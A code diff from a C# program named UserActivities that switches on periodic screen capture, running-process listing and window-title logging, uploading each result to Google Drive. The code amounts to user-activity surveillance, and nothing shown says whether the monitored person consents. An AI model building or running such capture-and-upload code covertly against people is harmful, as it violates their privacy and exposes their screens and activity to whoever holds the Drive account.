@@ -24,20 +24,20 @@ namespace UserActivities
 
         public Application(IEgmaCv egmaCv,
             IScreenCaptureService screenCaptureService,
+            IRunningProgramService runningProgramService,
             
             IDirectoryManagerService directoryManagerService,
             IGoogleDriveApiManagerAdapter googleDriveApiManagerAdapter,
-            IRunningProgramService runningProgramService,
             IActiveProgramService activeProgramService,
             IBrowserActivityService browserActivityService)
         {
             _egmaCv = egmaCv;
             _screenCaptureService = screenCaptureService;
+            _runningProgramService = runningProgramService;
 
             _directoryManagerService = directoryManagerService;
             _folderName = AppSettingsInfo.GetCurrentValue<string>("FolderName");
             _googleDriveApiManagerAdapter = googleDriveApiManagerAdapter;
-            _runningProgramService = runningProgramService;
             _activeProgramService = activeProgramService;
             _browserActivityService = browserActivityService;
         }
@@ -55,22 +55,22 @@ namespace UserActivities
                 await _googleDriveApiManagerAdapter.UploadFileAsync(filePath);
 
                 ////Capture user screen and sync to google drive
-                //fileName = $"{Guid.NewGuid()}.jpg";
-                //filePath = _directoryManagerService.CreateProgramDataFilePath(_folderName, fileName);
-                //await _screenCaptureService.CaptureScreenAsync(1920, 1080, filePath);
-                //await _googleDriveApiManagerAdapter.UploadFileAsync(filePath);
+                fileName = $"{Guid.NewGuid()}.jpg";
+                filePath = _directoryManagerService.CreateProgramDataFilePath(_folderName, fileName);
+                await _screenCaptureService.CaptureScreenAsync(1920, 1080, filePath);
+                await _googleDriveApiManagerAdapter.UploadFileAsync(filePath);
 
                 ////Capture processes and sync to google drive 
-                //fileName = $"Processes-{Guid.NewGuid()}.txt";
-                //filePath = _directoryManagerService.CreateProgramDataFilePath(_folderName, fileName);
-                //await _runningProgramService.CaptureProcessNameAsync(filePath);
-                //await _googleDriveApiManagerAdapter.UploadFileAsync(filePath);
+                fileName = $"Processes-{Guid.NewGuid()}.txt";
+                filePath = _directoryManagerService.CreateProgramDataFilePath(_folderName, fileName);
+                await _runningProgramService.CaptureProcessNameAsync(filePath);
+                await _googleDriveApiManagerAdapter.UploadFileAsync(filePath);
 
                 ////Capture running program title and sync to google drive 
-                //fileName = $"ProgramTitles-{Guid.NewGuid()}.txt";
-                //filePath = _directoryManagerService.CreateProgramDataFilePath(_folderName, fileName);
-                //await _runningProgramService.CaptureProgramTitleAsync(filePath);
-                //await _googleDriveApiManagerAdapter.UploadFileAsync(filePath);
+                fileName = $"ProgramTitles-{Guid.NewGuid()}.txt";
+                filePath = _directoryManagerService.CreateProgramDataFilePath(_folderName, fileName);
+                await _runningProgramService.CaptureProgramTitleAsync(filePath);
+                await _googleDriveApiManagerAdapter.UploadFileAsync(filePath);
 
                 ////Capture active window title and sync to google drive 
                 //fileName = $"ActiveWindow-{Guid.NewGuid()}.txt";
